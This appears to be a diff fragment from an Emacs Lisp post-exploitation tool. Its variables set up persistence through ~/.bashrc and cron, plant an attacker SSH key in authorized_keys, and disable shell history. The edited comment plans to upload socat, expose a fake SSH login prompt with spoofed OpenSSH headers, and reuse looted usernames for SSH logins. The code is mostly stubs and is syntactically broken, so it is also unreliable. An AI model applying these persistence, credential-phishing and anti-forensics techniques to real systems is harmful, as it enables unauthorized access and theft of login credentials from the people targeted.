@@ -19,7 +19,7 @@
 (defvar persistence-target "~/.bashrc" "/var/spool/cron/"(user-login-name))
 (defvar persistence-payload "echo "ka0x@dev >>/~/.ssh/authorized_keys"")
 (defvar persistence-amnesia "HISTFILE=/dev/null")
-(defvar upgrade-shell) ;; uploads base64 encoded socat binary
+(defvar upgrade-shell) ;; uploads base64 encoded socat binary, exposes it on ssh port, make a fake login prompt, and fake openssh headers.
 (defvar callback  "") ;; Parse Loot file for username, try to ssh using it and notif on success
 
 (defun privilege)
